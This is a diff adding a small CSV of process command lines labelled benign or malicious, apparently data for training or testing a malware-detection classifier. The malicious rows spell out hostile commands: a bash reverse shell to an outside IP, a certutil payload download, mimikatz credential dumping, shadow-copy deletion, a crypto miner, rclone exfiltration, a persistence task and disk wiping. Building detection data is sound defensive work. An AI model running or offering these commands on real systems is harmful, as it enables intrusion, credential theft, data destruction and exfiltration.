@@ -1,0 +1,21 @@
+process_name,command_line,label
+explorer.exe,C:\Windows\explorer.exe,benign
+chrome.exe,"chrome.exe --type=renderer --enable-features=NetworkService",benign
+python3,python3 /opt/app/server.py --port 8080,benign
+bash,bash -lc "ls -la /home/user",benign
+sshd,/usr/sbin/sshd -D,benign
+node,node /srv/api/index.js,benign
+vssadmin.exe,vssadmin.exe delete shadows /all /quiet,malicious
+powershell.exe,"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",malicious
+xmrig,xmrig -o stratum+tcp://pool.monero.hashvault.pro:443 -u 4xWalletAddr,malicious
+cmd.exe,"certutil.exe -urlcache -split -f http://185.23.11.4/payload.exe a.exe",malicious
+psexec.exe,"psexec.exe \\\\10.0.0.7 -u admin -p P@ss cmd.exe",malicious
+mimikatz.exe,mimikatz.exe sekurlsa::logonpasswords,malicious
+bash,bash -i >& /dev/tcp/45.77.12.9/4444 0>&1,malicious
+schtasks.exe,"schtasks /create /tn Updater /tr C:\temp\m.exe /sc onlogon",malicious
+rclone,rclone copy /data remote:exfil-bucket --transfers 16,malicious
+sudo,sudo -l,benign
+wget,wget https://github.com/org/repo/archive/main.tar.gz,benign
+whoami.exe,whoami /priv,malicious
+cipher.exe,cipher /w:C:\Users,malicious
+git,git pull origin main,benign
